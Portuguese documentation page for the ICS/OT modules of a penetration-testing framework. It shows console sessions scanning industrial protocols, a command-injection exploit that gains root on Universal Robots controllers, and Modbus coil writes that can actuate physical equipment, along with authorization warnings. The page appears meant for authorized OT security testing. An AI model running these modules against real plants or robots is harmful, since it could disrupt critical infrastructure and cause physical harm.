# Módulos ICS / OT Industrial

**Idioma:** Português (pt-BR). **English:** — *(página exclusiva pt-BR)*

---

## Visão geral

Os módulos ICS/OT do EmbedXPL-Forge cobrem protocolos industriais, PLCs, SCADAs e equipamentos de automação de infraestrutura crítica. Eles permitem avaliação de segurança autorizada de ambientes OT (Operational Technology) seguindo os padrões IEC 62443 e NERC CIP.

> **Autorização obrigatória e cuidado redobrado.** Sistemas ICS/OT controlam infraestrutura crítica. Testes não autorizados ou incorretos podem causar danos físicos. Use APENAS em ambientes de teste isolados ou com autorização formal explícita do proprietário do sistema.

---

## Estrutura de módulos ICS/OT

```
embedxpl/modules/
├── scanners/ics/
│   ├── modbus_scanner          Scanner Modbus TCP (porta 502)
│   ├── modbus_id_fuzzer        Fuzzer de ID de dispositivo Modbus
│   ├── bacnet_scanner          Scanner BACnet/IP (porta 47808)
│   ├── s7_comm_scanner         Scanner S7comm Siemens (porta 102)
│   ├── s7comm_plus_scanner     Scanner S7comm+ (S7-1200/1500)
│   ├── enip_scanner            Scanner EtherNet/IP (porta 44818)
│   ├── cip_scanner             Scanner CIP (Common Industrial Protocol)
│   ├── dnp3_scanner            Scanner DNP3 (porta 20000)
│   ├── profinet_dcp_scanner    Scanner PROFINET DCP
│   ├── vxworks_scanner         Detector de sistemas VxWorks
│   └── rockwell_discover       Descoberta de PLCs Rockwell Allen-Bradley
│
├── exploits/ics/
│   ├── ur_polyscope5_dashboard_cmd_injection_cve_2026_8153
│   ├── modbus_coil_write       Escrita de bobinas Modbus (Função 05)
│   ├── modbus_register_write   Escrita de registros Modbus (Função 06/16)
│   ├── s7_cpu_stop             Comando STOP do PLC Siemens S7
│   ├── enip_identify           Identificação de dispositivos EtherNet/IP
│   └── ...
│
└── creds/ics/
    ├── default_creds_siemens   Credenciais padrão Siemens HMI/PLC
    ├── default_creds_rockwell  Credenciais padrão Allen-Bradley
    ├── default_creds_schneider Credenciais padrão Schneider Electric
    └── ...
```

---

## Scanners de protocolo industrial

### Modbus TCP

O Modbus TCP é um dos protocolos industriais mais difundidos. Ouve na porta 502.

**Scanner Modbus:**

```text
exf > use scanners/ics/modbus_scanner
exf (Modbus TCP Scanner) > set target 192.168.100.10
[+] target => 192.168.100.10
exf (Modbus TCP Scanner) > show options

Target options:
┌────────┬──────────────────┬────────────────────────────────────────┐
│ Name   │ Current settings │ Description                            │
├────────┼──────────────────┼────────────────────────────────────────┤
│ target │ 192.168.100.10   │ Target IP address                      │
│ port   │ 502              │ Modbus TCP port                        │
└────────┴──────────────────┴────────────────────────────────────────┘

Module options:
┌──────────────────┬──────────────────┬────────────────────────────────────┐
│ Name             │ Current settings │ Description                        │
├──────────────────┼──────────────────┼────────────────────────────────────┤
│ unit_id          │ 1                │ Modbus Unit ID (slave address)      │
│ scan_registers   │ True             │ Read holding registers (FC03)       │
│ scan_coils       │ True             │ Read coil status (FC01)             │
│ timeout          │ 5                │ Connection timeout in seconds        │
└──────────────────┴──────────────────┴────────────────────────────────────┘

exf (Modbus TCP Scanner) > run
[*] Running module ...
[*] Connecting to Modbus TCP at 192.168.100.10:502...
[+] Device identified: Unit ID 1
[+] Vendor: Schneider Electric
[+] Product code: M340 PLC
[*] Reading coils (FC01): addresses 0-99
[+] Coil 0: ON
[+] Coil 1: OFF
[+] Coil 5: ON
[*] Reading holding registers (FC03): addresses 0-49
[+] Register 0: 0x00FF (255)
[+] Register 1: 0x1234 (4660)
[+] Modbus scan complete — 2 active coils, 2 populated registers
```

---

### BACnet/IP

O protocolo BACnet é amplamente usado em sistemas de automação predial (HVAC, controle de acesso, energia).

```text
exf > use scanners/ics/bacnet_scanner
exf (BACnet/IP Scanner) > set target 192.168.100.0/24
[+] target => 192.168.100.0/24
exf (BACnet/IP Scanner) > run
[*] Running module ...
[*] Broadcasting BACnet Who-Is to 192.168.100.0/24...
[+] BACnet device found: 192.168.100.20 (Instance 1234)
    Vendor: Siemens AG
    Model: DESIGO CC
    Firmware: 4.0.1.1
[+] BACnet device found: 192.168.100.25 (Instance 5678)
    Vendor: Johnson Controls
    Model: Metasys
    Firmware: 10.1.0
[+] Found 2 BACnet devices on network
```

---

### Siemens S7comm

O protocolo S7comm é proprietário da Siemens e usado em PLCs SIMATIC S7.

```text
exf > use scanners/ics/s7_comm_scanner
exf (S7comm Scanner) > set target 192.168.100.30
[+] target => 192.168.100.30
exf (S7comm Scanner) > run
[*] Running module ...
[*] Connecting to S7comm at 192.168.100.30:102...
[+] S7 PLC identified:
    PLC Name: PLC_CPU315
    Module type: CPU315-2 PN/DP
    Serial number: S C-B8J428
    Hardware version: 0x001
    Firmware version: V3.2.6
[+] Memory blocks accessible:
    - DB1 (Data Block 1)
    - DB100 (Data Block 100)
[*] CPU State: RUN
[!] S7comm: No authentication required — full read/write access
```

---

### EtherNet/IP (CIP)

```text
exf > use scanners/ics/enip_scanner
exf (EtherNet/IP Scanner) > set target 192.168.100.40
[+] target => 192.168.100.40
exf (EtherNet/IP Scanner) > run
[*] Running module ...
[*] Sending CIP List Identity request to 192.168.100.40:44818...
[+] EtherNet/IP device identified:
    Vendor: Rockwell Automation / Allen-Bradley
    Device Type: Programmable Logic Controller
    Product Name: 1756-L73 LOGIX5573
    Major Revision: 30
    Minor Revision: 11
    Serial Number: 0x00640001
    Status: Running
```

---

### DNP3

O DNP3 é usado em sistemas SCADA de energia elétrica, água e petróleo/gás.

```text
exf > use scanners/ics/dnp3_scanner
exf (DNP3 Scanner) > set target 192.168.100.50
[+] target => 192.168.100.50
exf (DNP3 Scanner) > run
[*] Running module ...
[*] Sending DNP3 Data Link Reset to 192.168.100.50:20000...
[+] DNP3 device responding
    Source address: 3
    Destination: 1 (master)
    DNP3 version: 3
[*] Reading binary inputs (Group 1)...
[+] DNP3 scan successful — device is accessible without authentication
```

---

## Exploits ICS

### Universal Robots PolyScope 5 (CVE-2026-8153)

```text
exf > use exploits/ics/ur_polyscope5_dashboard_cmd_injection_cve_2026_8153
exf (UR PolyScope5 Dashboard Command Injection) > set target 10.0.1.5
[+] target => 10.0.1.5
exf (UR PolyScope5 Dashboard Command Injection) > set cmd "id"
[+] cmd => id
exf (UR PolyScope5 Dashboard Command Injection) > check
[+] Target is vulnerable
exf (UR PolyScope5 Dashboard Command Injection) > run
[*] Running module ...
[*] Connecting to PolyScope Dashboard on 10.0.1.5:29999
[+] PolyScope Dashboard Server detected
[*] Attempting OS command injection (CVE-2026-8153)
[+] Command injection confirmed!
[+] Output: uid=0(root) gid=0(root) groups=0(root)
```

**Descrição:** CVE-2026-8153 é uma injeção de comando no servidor Dashboard do Universal Robots PolyScope 5. A interface de dashboard na porta 29999 aceita comandos diretamente sem sanitização adequada, permitindo RCE como root no robô.

**Dispositivos afetados:** Universal Robots UR3e, UR5e, UR10e, UR16e — PolyScope 5 antes da versão 5.13.

---

### Escrita de bobinas Modbus (acesso sem autenticação)

```text
exf > use exploits/ics/modbus_coil_write
exf (Modbus Coil Write) > set target 192.168.100.10
[+] target => 192.168.100.10
exf (Modbus Coil Write) > set coil_address 5
[+] coil_address => 5
exf (Modbus Coil Write) > set coil_value true
[+] coil_value => true
exf (Modbus Coil Write) > run
[*] Running module ...
[*] Sending Modbus Write Single Coil (FC05) to 192.168.100.10:502...
[+] Coil 5 set to ON successfully
[!] CAUTION: This may activate physical equipment (relays, actuators, valves)
```

> **Aviso:** Escrever bobinas/registros Modbus pode acionar equipamentos físicos. Use somente em PLCs isolados do processo real.

---

## Descoberta e identificação de dispositivos OT

### Rockwell Allen-Bradley PLCs

```text
exf > use scanners/ics/rockwell_discover
exf (Rockwell PLC Discover) > set target 192.168.100.0/24
[+] target => 192.168.100.0/24
exf (Rockwell PLC Discover) > run
[*] Running module ...
[*] Scanning 192.168.100.0/24 for Rockwell PLCs (EtherNet/IP port 44818)...
[+] 192.168.100.40 — 1756-L73 LOGIX5573 (MicroLogix 1400)
[+] 192.168.100.41 — 1769-L33ER CompactLogix L33ER
[+] Found 2 Rockwell PLC(s)
```

### PROFINET DCP

```text
exf > use scanners/ics/profinet_dcp_scanner
exf (PROFINET DCP Scanner) > set target 192.168.100.0/24
[+] target => 192.168.100.0/24
exf (PROFINET DCP Scanner) > run
[*] Running module ...
[*] Sending PROFINET DCP Identify All...
[+] 192.168.100.50 — Siemens SCALANCE X208 (switch industrial)
[+] 192.168.100.51 — Siemens S7-1515-2 PN (PLC)
[+] 192.168.100.52 — Phoenix Contact FL SWITCH 2108 (switch)
[+] Found 3 PROFINET device(s)
```

---

## Referência de CVEs ICS

| CVE | CVSS | Vendor | Produto | Tipo |
|-----|------|--------|---------|------|
| CVE-2026-8153 | 9.8 | Universal Robots | PolyScope 5 | RCE via injeção de comando no dashboard |
| CVE-2019-13945 | 9.8 | Siemens | S7-1200/1500 | Bypass de autenticação via PROFINET DCP |
| CVE-2017-6742 | 9.8 | Cisco | IOS (SNMP) | RCE via SNMP |
| CVE-2013-2780 | 8.5 | Schneider Electric | PMCA100 | Execução remota de código |
| CVE-2012-1571 | 7.8 | GE | D20ME | Divulgação de credenciais via FTP |

---

## Boas práticas para avaliações OT/ICS

1. **Janela de manutenção:** Sempre realize testes durante janelas de manutenção planejadas, com sistemas em modo de segurança ou redundância ativa.

2. **Modo passivo primeiro:** Use scanners passivos (somente leitura) antes de tentar qualquer escrita ou exploit.

3. **Backup de configuração:** Faça backup da configuração do PLC/HMI antes de qualquer teste.

4. **Comunicação com operações:** Mantenha comunicação constante com a equipe de operações durante os testes.

5. **Rollback imediato:** Tenha um plano de rollback documentado para cada módulo de escrita que for usar.

6. **Isolamento de rede:** Se possível, desconecte o sistema de processos físicos antes dos testes.

---

[Hub da Wiki](../README.md)
